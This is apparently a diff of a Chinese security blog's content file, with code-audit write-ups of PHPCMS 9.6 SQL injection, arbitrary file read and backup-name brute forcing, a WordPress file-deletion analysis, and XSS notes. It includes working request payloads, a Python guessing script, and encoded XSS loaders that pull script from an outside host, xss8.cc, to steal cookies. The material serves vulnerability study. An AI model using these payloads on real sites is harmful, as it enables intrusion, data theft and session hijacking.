&#125;</span><br><span class="line">	wp_redirect( add_query_arg(<span class="string">&#x27;deleted&#x27;</span>, <span class="number">1</span>, <span class="variable">$sendback</span>) );</span><br><span class="line">	<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzyibq26j30yf0bhdkh.jpg" alt="image-20210715161331519"></p>
-<p>把得到的set-cookie 记录下来</p>
-<p>第二步以POST方式访问【下面是测试爆user的】就是一个报错注入语句</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></table></figure>
+<p>由于我们删除的是图片附件，所以程序会进入<code>wp_delete_attachment</code>函数。wp-include/post.php。截取关键部分5002行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>(<span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>]) ) &#123;  <span class="comment">//5002行</span></span><br><span class="line">	<span class="keyword">if</span> (! <span class="variable">$wpdb</span>-&gt;get_row( <span class="variable">$wpdb</span>-&gt;prepare( <span class="string">&quot;SELECT meta_id FROM <span class="subst">$wpdb</span>-&gt;postmeta WHERE meta_key = &#x27;_wp_attachment_metadata&#x27; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;</span>, <span class="string">&#x27;%&#x27;</span> . <span class="variable">$wpdb</span>-=&gt;esc_like(<span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>] ) . <span class="string">&#x27;%&#x27;</span>, <span class="variable">$post_id</span>)) ) &#123;</span><br><span class="line">	<span class="variable">$thumbfile</span> = str_replace(basename(<span class="variable">$file</span>), <span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span>);</span><br><span class="line">	<span class="variable">$thumbfile</span> = apply_filters( <span class="string">&#x27;wp_delete_file&#x27;</span>, <span class="variable">$thumbfile</span> );</span><br><span class="line">	@ unlink( path_join(<span class="variable">$uploadpath</span>[<span class="string">&#x27;basedir&#x27;</span>], <span class="variable">$thumbfile</span>) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<p>并且传参<code>userid_flash</code>其中的值就是第一步我们得到的<code>set-cookie</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;72eciDDbmkE3Tr6LjGQhB3H34p3N1xsgWWbi2VNY</span><br></pre></td></tr></table></figure>
+<p>然而<code>$meta[&#39;thumb&#39;]</code>可控并且没有任何过滤。从数据库中带出来【为什么从数据库带出来呢】</p>
+<p>在/wp-admin/post.php文件中，也就是我们第一步POST传入的值。直接带进去的更新我们的图片文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:  <span class="comment">//178行</span></span><br><span class="line">	check_admin_referer(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Don&#x27;t let these be changed</span></span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guid&#x27;</span>]);</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update the thumbnail filename</span></span><br><span class="line">	<span class="variable">$newmeta</span> = wp_get_attachment_metadata( <span class="variable">$post_id</span>, <span class="literal">true</span> );</span><br><span class="line">	<span class="variable">$newmeta</span>[<span class="string">&#x27;thumb&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line">	wp_update_attachment_metadata( <span class="variable">$post_id</span>, <span class="variable">$newmeta</span> );</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzynsljcj30yd0dxgst.jpg" alt="image-20210715162132366"></p>
-<p>把加密的<code>json</code>值记录下来</p>
-<p>第三步以POST的方式访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzytncdwj316i0emwn5.jpg" alt="image-20210715163120554"></p>
-<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其实我们就是通过最后一次提交的数据来爆出来的东西。我们就逆向分析。看第三步的URL做了些什么</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>
-
-<p>我们定位到<code>content</code>模块<code>down</code>文件中发现并没有<code>a_k</code>方法</p>
-<p>说明是自动执行的那就是<code>init()</code>和<code>__construct()</code></p>
-<p><code>__construct()</code>基本没东西，我们直接下断<code>init</code></p>
-<p>走到14行看到<code>sys_auth</code>然后他就是一个加密解密的函数，我们这里不分析加密解密只分析功能</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzyyyv6mj316m0al7dq.jpg" alt="image-20210715164258371"></p>
-<p>经过<code>sys_auth</code>解密得到</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id&#x3D;%27 and updatexml(1,concat(1,(user())),1)#&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>走到17行发现一个系统函数<code>parse_str</code> 这个函数用不好容易出现变量覆盖。可以自己查一下</p>
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzz5ei7jj30s80ha11m.jpg" alt="image-20210715165137462"></p>
-<p>我们知道用法了就是把<code>$id</code>给弄出来</p>
-<p>然后直接到26行跟踪<code>get_one</code>函数，发现后面就直接执行语句了。</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzzdjm7dj614v0grqcu02.jpg" alt="image-20210715173420523"></p>
-<p>肯定有人现在好奇那第三步为什么会得到这个值，我们返回到14行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a_k &#x3D; sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));</span><br></pre></td></tr></table></figure>
-
-<p>我们怎么得到a_k的值，怎么得到的这个规范进行解密，因为他需要(‘system’,’auth_key’)我们并不知道</p>
-<p>所以我们需要知道谁调用了这个函数</p>
-<p>我们回到第二步的POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;&amp;id&#x3D;###payload###&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;</span><br><span class="line"></span><br><span class="line">userid_flash&#x3D;Set-Cookie</span><br></pre></td></tr></table></figure>
-
-<p>我们找到<code>attachment</code>模块下的<code>attachments</code>文件中的<code>swfupload_json</code>函数</p>
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzzk7j73j30vw0bjjxp.jpg" alt="image-20210715175112616"></p>
-<p>到<code>src</code>时有一个<code>safe_replace</code>函数我们跟进</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzzqgxsgj313b0h3gxn.jpg" alt="image-20210715183735791"></p>
-<p>发现一个waf所以我们的src为什么要写成%*27的原因，就是为了绕过一次waf</p>
-<p>继续到<code>set_cookie</code>我们跟进去发现<code>set_cookie</code>调用了<code>sys_auth</code>这个函数并且进行了<code>ENCODE</code>刚好我们又可以再前台看见</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzzvvhocj316r09xdnt.jpg" alt="image-20210715175343564"></p>
-<p>至于我们为什么要传入一个POST值，是在<code>__construct</code>中如果没有这个<code>userid</code>他会<code>showmessage</code></p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi0020owtj3177063wjx.jpg" alt="image-20210715180755944"></p>
-<p>而<code>userid</code>是17行的关键代码。我们肯定没有<code>userid</code>嘛所以三元表达式到第三个，他进行解密一次并且<code>userid=1</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>
-
-<p>现在POST值是怎么拿到的呢，回到第一步，访问的URL</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<p>我们周到<code>wap</code>下的<code>index</code>下的<code>siteid</code> 而<code>siteid</code>直接就在<code>__construct</code>函数里面，于是经过一次<code>set_cookie</code>加密</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi007ce39j30zf08gtfc.jpg" alt="image-20210715185530441"></p>
-<p>我们现在来顺利一下整个过程</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00c9wrvj30vk0ihh2a.jpg" alt="image-20210715193138877"></p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>把$a_k过滤一次,把$id用<code>intval</code>过滤一次</p>
-<h1 id="PHPCMS9-6-1任意文件读取"><a href="#PHPCMS9-6-1任意文件读取" class="headerlink" title="PHPCMS9.6.1任意文件读取"></a>PHPCMS9.6.1任意文件读取</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>步骤同上一个漏洞所以就不截图了</p>
-<p>第一步访问把得到的set-cookie 记录下来</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1 </span><br></pre></td></tr></table></figure>
-
-<p>第二步访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D.&#x2F;phpcms&#x2F;base%26f%3D.p%25253chp</span><br></pre></td></tr></table></figure>
-
-<p>同样POST传递值</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;第一步获取的Set-cookie</span><br></pre></td></tr></table></figure>
-
-<p>第三部访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;第二步获取的set-cookie</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi00ihqhnj30ww0dzq6g.jpg" alt="image-20210715201247818"></p>
-<p>就可以下载我们要下载的文件</p>
-<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们还是和<code>wap_SQL注入</code>那样逆向分析一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>
-
-<p>经过解密之后</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00nmiqfj316p06jdmj.jpg" alt="image-20210715205338895"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;pad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.\&#x2F;phpcms\&#x2F;base&amp;f&#x3D;.p%253chp&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>经过<code>safe_replace</code>处理之后</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;quotaid&amp;quot:1,&amp;quotsrc&amp;quot:&amp;quotpad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.&#x2F;phpcms&#x2F;base&amp;f&#x3D;.p%253chp&amp;quot,&amp;quotfilename&amp;quot:&amp;quot&amp;quot</span><br></pre></td></tr></table></figure>
-
-<p>但是我们关键的是&amp;s和&amp;f没有任何变化</p>
-<p>再经过<code>parse_str</code>处理我们的url会被解码一次</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsi00rwoy1j311h03y0v5.jpg" alt="image-20210715205642241"></p>
-<p><code>$f现在就是.p%3cphp</code></p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsi00w5ajdj315f0fg4d1.jpg" alt="image-20210715210151809"></p>
-<p>然后<code>downurl</code>发生变化我们点击下载到download函数</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi010iwqlj611y0i4du502.jpg" alt="image-20210715210928651"></p>
-<p>经过一次解密再经过<code>parse_str</code>转码<code>%3c=&gt; &lt;</code></p>
-<p>走到118行因为传递的m=1经过<code>$fileurl</code>把他拼接起来变成</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\phpcms\base.p&lt;hp</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($m) $fileurl &#x3D; trim($s).trim($fileurl);  &#x2F;&#x2F;118行代码</span><br></pre></td></tr></table></figure>
-
-<p>然后走到125行进行随机名称生成，126行他又把<code>$fileurl</code>的&lt;给去掉了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filename &#x3D; date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;      &#x2F;&#x2F;125</span><br><span class="line">$fileurl &#x3D; str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl);    &#x2F;&#x2F;126</span><br></pre></td></tr></table></figure>
-
-<p>然后就进行一个原始下载。</p>
-<p>第二部分和第一部分参考上面<code>wap_sql</code>注入,原理一样。我们现在梳理一下这个漏洞。</p>
-<p>从最下面分析，他过滤了&lt;&gt; 然后到上面php等一些黑名单 那就P&lt;HP就可以</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsi0155bxjj313q0gczvh.jpg" alt="image-20210715212632058"></p>
-<p><code>$fileurl</code>是通过<code>$s</code>来的和<code>$f</code>来的。而<code>$f和$s</code>是通过构造<code>$a_k</code>来的，其中就<code>DECODE</code> 了两次</p>
-<p>所以要通过<code>siteid=1</code>来进行<code>ENCODE</code>一次。我们为什么要传一个<code>userid_flash</code></p>
-<p>因为<code>attachments</code>下的析构函数中的<code>userid</code>不能为空<br>而我们没登陆所以需要<code>sys_auth($_POST[&#39;userid_flash&#39;],DECODE&#39;)</code>解密一下传入的<code>userid_flash</code>使得<code>userid=1</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] :(param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) :sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>
-
-<p>又经过<code>set_cookie(&#39;att_json&#39;,$json_str)</code>;然后又返回到前台<code>set-cookie</code></p>
-<p>最终通过以下方法进行了下载</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote>
-<p>官方V9.6.2是先过滤&lt;&gt;再进行php等黑名单过滤，我们还是可以继续通过空白字符来进行绕过的<br>%81-%99间的字符是不会被trim去掉的且在windows中还能正常访问到相应的文件。并且得到auth_key之后还可以进行其他的操作例如SQL注入等</p>
-</blockquote>
-<h1 id="PHPCMSV9暴力猜解数据库"><a href="#PHPCMSV9暴力猜解数据库" class="headerlink" title="PHPCMSV9暴力猜解数据库"></a>PHPCMSV9暴力猜解数据库</h1><blockquote>
-<p>备份路径 \caches\bakup\default\xxxx.sql</p>
-</blockquote>
-<p>而问题出现在哪，我们先看POC。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc:</span><br><span class="line">&#x2F;api.php?op&#x3D;creatimg&amp;txt&#x3D;1&amp;font&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;caches&#x2F;bakup&#x2F;default&#x2F;s&lt;&lt;.sql</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsi019u7foj30so0bsn67.jpg" alt="image-20210715221054129"></p>
-<p>原因：</p>
-<blockquote>
-<p>windows的FindFirstFile（API)有个特性就是可以把&lt;&lt;当成通配符来用而PHP的opendir(win32readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。<br>pwaaov0zodprrm5371pe_db_20210715_1.sql<br>file_exists — opendir  – FindFirstFile – &lt;&lt;  通配符<br>file_exists  - &lt;&lt;  通配符<br>333xxxx.sql<br>3&lt;&lt;.sql<br>file_exists(3&lt;&lt;.sql)</p>
-</blockquote>
-<p>因为返回的只不同所以我们可以逐个猜解</p>
-<p>附上斗鱼Sec脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: dysec</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    mark = <span class="literal">True</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    req.add_header(<span class="string">&#x27;User-agent&#x27;</span>, <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    content = response.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Cannot&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        mark = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> mark</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span>(<span class="params">target</span>):</span></span><br><span class="line">    arr = []</span><br><span class="line">    num = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">58</span>))</span><br><span class="line">    alpha = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>))</span><br><span class="line">    exploit = <span class="string">&#x27;%s/api.php?op=creatimg&amp;txt=dysec&amp;font=/../../../../caches/bakup/default/%s%s&lt;&lt;.sql&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                arr.append(char)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">20</span>:</span><br><span class="line">                <span class="keyword">for</span> char <span class="keyword">in</span> alpha:</span><br><span class="line">                    <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                        arr.append(char)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">20</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_db_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">29</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_1.sql&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[*]not find!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[*]find: %s/caches/bakup/default/%s&#x27;</span> % (target, <span class="string">&#x27;&#x27;</span>.join(arr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        url = <span class="string">&#x27;http://www.x.com&#x27;</span></span><br><span class="line">        <span class="comment">#test</span></span><br><span class="line">        guest(url)</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>过滤$_POST[‘thumb’]</p>
 ]]></content>
       <tags>
         <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
+    <title>XSS一些记录</title>
+    <url>/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h3 id="XSS一些总结"><a href="#XSS一些总结" class="headerlink" title="XSS一些总结"></a>XSS一些总结</h3><p>除了script以外大多标签自动加载触发JS代码大多用的都是on事件，以下标签都可以用下面的方法去打Cookie以及url等</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;&lt;input&gt;&lt;details&gt;&lt;svg&gt;&lt;select&gt;&lt;iframe&gt;</span><br><span class="line">&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;  &lt;body&gt;&lt;Style&gt;&lt;Media&gt;</span><br><span class="line">such <span class="keyword">as</span>: 其他的标签自动触发百度一下就好了</span><br><span class="line">&lt;body onpageshow=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br><span class="line">Media 标签是利用音视频标签来加载XSS Payload</span><br><span class="line">测试了一下自动触发事件的标签</span><br><span class="line">onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</span><br><span class="line"></span><br><span class="line">&lt;audio onloadstart=alert(<span class="number">1</span>) src=<span class="string">&quot;x.mp3&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">反射内容</span><br><span class="line">-alert(<span class="number">1</span>)-  -prompt(<span class="number">1</span>)- -confirm(<span class="number">1</span>)-</span><br><span class="line"></span><br><span class="line">javascript伪协议</span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>);&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">利用link远程包含js文件</span><br><span class="line">PS：在无CSP的情况下才可以</span><br><span class="line">&lt;link rel=<span class="keyword">import</span> href=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见的绕过技巧"><a href="#常见的绕过技巧" class="headerlink" title="常见的绕过技巧"></a>常见的绕过技巧</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、用&#x2F;代替空格</span><br><span class="line">&lt;img&#x2F;src&#x3D;&quot;x&quot;&#x2F;onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">2、大小写绕过</span><br><span class="line">3、双写关键字</span><br><span class="line">4、字符拼接</span><br><span class="line">利用eval:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;a&#x3D;&#96;aler&#96;;b&#x3D;&#96;t&#96;;c&#x3D;&#39;(&#96;xss&#96;);&#39;;eval(a+b+c)&quot;&gt;</span><br><span class="line">利用top:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;top[&quot;al&quot;+&quot;ert&quot;](&#96;xss&#96;);&gt;</span><br><span class="line">    </span><br><span class="line">5、编码绕过</span><br><span class="line">------------------</span><br><span class="line">Base64编码</span><br><span class="line">------------------</span><br><span class="line">&#39;&quot;&gt;&lt;img src&#x3D;x id&#x3D;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy9uR1JTIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#x3D;&#x3D; onerror&#x3D;eval(atob(this.id))&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNDUmlQdC9TckM9Ly94c3M4LmNjL25HUlM+&quot;&gt;</span><br><span class="line">------------------</span><br><span class="line">ASCII编码</span><br><span class="line">------------------</span><br><span class="line">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,56,46,99,99,47,110,71,82,83,62,60,47,115,67,114,73,112,84,62))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line">-------------------</span><br><span class="line">空字节【未成功过，自测】</span><br><span class="line">-------------------</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;&#x2F;s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line">-------------------</span><br><span class="line">Unicode编码绕过</span><br><span class="line">-------------------</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</span><br><span class="line">-------------------</span><br></pre></td></tr></table></figure>
+
+<h4 id="常见字符过滤"><a href="#常见字符过滤" class="headerlink" title="常见字符过滤"></a>常见字符过滤</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">*过滤&lt;script&gt;利用拼接然后继续使用XSS平台【双写，编码自己自己尝试】</span><br><span class="line">&lt;img src=x onerror=s=createElement(<span class="string">&#x27;scr&#x27;</span>+<span class="string">&#x27;ipt&#x27;</span>);body.appendChild(s);s.src=<span class="string">&#x27;//xss8.cc/nGRS&#x27;</span>;&gt;</span><br><span class="line"></span><br><span class="line">*过滤单双引号</span><br><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=alert(<span class="string">`xss`</span>);&gt;</span><br><span class="line">    </span><br><span class="line">*过滤括号</span><br><span class="line">当括号被过滤的时候可以使用<span class="keyword">throw</span>来绕过</span><br><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">*过滤url地址</span><br><span class="line">使用URL编码、十进制IP、八进制IP、hex、html标签中用<span class="comment">//可以代替http://、使用\\</span></span><br><span class="line">使用中文逗号代替英文逗号</span><br><span class="line"></span><br><span class="line">其他的Payload</span><br><span class="line">&lt;svg/onload=location=<span class="string">`javas`</span>+<span class="string">`cript:ale`</span>+<span class="string">`rt%2`</span>+<span class="string">`81%2`</span>+<span class="string">`9`</span>;</span><br><span class="line"></span><br><span class="line">Eval &amp; 其它冗余符号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="built_in">eval</span>()&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;~a~le~rt~~(~~1~~)~&#x27;</span>.replace(<span class="regexp">/~/g</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">eval</span>(\<span 